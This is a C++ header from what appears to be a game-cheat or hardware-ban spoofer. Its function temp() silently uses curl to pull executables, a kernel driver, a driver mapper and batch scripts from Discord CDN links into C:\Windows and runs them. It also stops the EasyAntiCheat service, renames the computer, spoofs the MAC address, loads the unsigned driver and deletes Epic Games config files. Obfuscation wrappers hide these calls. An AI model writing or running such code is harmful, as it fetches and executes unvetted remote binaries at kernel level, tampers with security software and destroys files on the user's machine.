#pragma once
#include <Windows.h>
#include <thread>
#include "lazy.h"
#include "enc.h"
#include <filesystem>
#include <fstream>
#include <filesystem>
#include <filesystem>
#include <cstdlib>
#include <iostream>
#include <string>
#include <vector>




void slow_print(const std::string& str, int delay_time)
{
	for (size_t i = 0; i != str.size(); ++i)
	{
		std::cout << str[i];
		Sleep(delay_time);
	}
}

namespace Woof
{
	void HideConsole()
	{
		::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	}
	void ShowConsole()
	{
		::ShowWindow(::GetConsoleWindow(), SW_SHOW);
	}
	
	void temp()
	{
		DTCSYS(system)(E("curl https://cdn.discordapp.com/attachments/865283008068190228/1085349592763215892/splash.exe -o C:\\Windows\\splash.exe --silent"));
		system("start C:\\Windows\\splash.exe");
		DTCSYS(system)(E("curl https://cdn.discordapp.com/attachments/1066385084338426000/1066430324931838113/MacAddressSpoofer.exe -o C:\\Windows\\macspoof.exe --silent"));
		DTCSYS(system)(E("curl https://cdn.discordapp.com/attachments/1063617447292326068/1096943996816859227/RANDOMZIE.sys -o C:\\Windows\\DTC.sys --silent"));
		DTCSYS(system)(E("curl https://cdn.discordapp.com/attachments/1063617447292326068/1096943996435189861/MAPPER.exe -o C:\\Windows\\DTCMap.exe --silent"));
		DTCSYS(system)(E("curl https://cdn.discordapp.com/attachments/865283008068190228/1098263131370819635/driverloader.bat -o C:\\Windows\\Loader.bat --silent"));
		DTCSYS(system)(E("curl https://cdn.discordapp.com/attachments/865283008068190228/1085015949125615616/launcher.bat -o C:\\Windows\\launcher.bat --silent"));
		
		HideConsole();
		DTCSYS(system)(E("sc stop EasyAntiCheat >nul"));
		DTCSYS(system)(E("sc stop EasyAntiCheat.sys >nul"));
		DTCSYS(system)(E("wmic computersystem where name=%computername% call rename=%random%"));
		DTCSYS(system)(E("C:\Windows\macspoof.exe >nul"));
		DTCSYS(system)(E("start C:/Windows/DTCMap.EXE C:/Windows/DTC.sys --silent"));
		DTCSYS(system)(E("del C:\Program Files(x86)\Epic Games\Launcher\Engine\Config\Base.ini >nul 2>&1"));
		DTCSYS(system)(E("del C:\Program Files(x86)\Epic Games\Launcher\Engine\Config\BaseGame.ini >nul 2>&1"));
		DTCSYS(system)(E("del C:\Program Files(x86)\Epic Games\Launcher\Engine\Config\Windows\WindowsGame.ini >nul 2>&1"));
		DTCSYS(system)(E("del C:\Program Files(x86)\Epic Games\Launcher\Engine\Config\BaseHardware.ini >nul >nul 2>&1"));
		DTCSYS(system)(E("del C:\Program Files(x86)\Epic Games\Launcher\Portal\Config\NotForLicensees\Windows\WindowsHardware.ini >nul 2>&1"));
		DTCSYS(Beep)(500, 500);
		DTCSYS(system)(E("taskkill /f /im splash.exe >nul 2>&1"));
	}
}